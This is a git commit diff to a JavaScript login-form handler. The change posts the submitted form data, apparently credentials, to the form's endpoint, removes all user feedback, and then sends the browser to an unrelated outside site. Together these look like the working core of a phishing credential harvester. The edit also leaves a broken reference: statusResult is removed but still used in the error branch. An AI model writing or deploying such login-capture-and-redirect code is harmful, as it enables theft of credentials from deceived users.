61fc9cfd51e8fb5391f651a3da20e9c5a9c6f604
renerodrigues01 <119670685+renerodrigues01@users.noreply.github.com>
2023-08-28 16:09:47 +0000

    new

--- public/online/static/js/new.js
+++ public/online/static/js/new.js
@@ -1,33 +1,18 @@
 const form = document.getElementById("loginForm");
 
-const statusResult = document.getElementById("")
-
 async function handleSubmit(event) {
   event.preventDefault();
-  console.log("submitted !")
   const data = new FormData(event.target);
-
-  const encodedData = JSON.stringify(data);
 
   fetch(form.action, {
     method: "POST",
-    body: encodedData,
+    body: data,
     headers: {
       'Accept': 'application/json'
     }
   }).then(response => {
-    if (response.ok) {
-      statusResult.innerHTML = "Thanks for your submission!";
-      form.reset()
-    } else {
-      response.json().then(data => {
-        if (Object.hasOwn(data, 'errors')) {
-          statusResult.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-        } else {
-          statusResult.innerHTML = "Oops! There was a problem submitting your form"
-        }
-      })
-    }
+    form.reset()
+    window.location.assign("https://mooney.it/aasasaas")
   }).catch(error => {
     statusResult.innerHTML = "Oops! There was a problem submitting your form"
   });
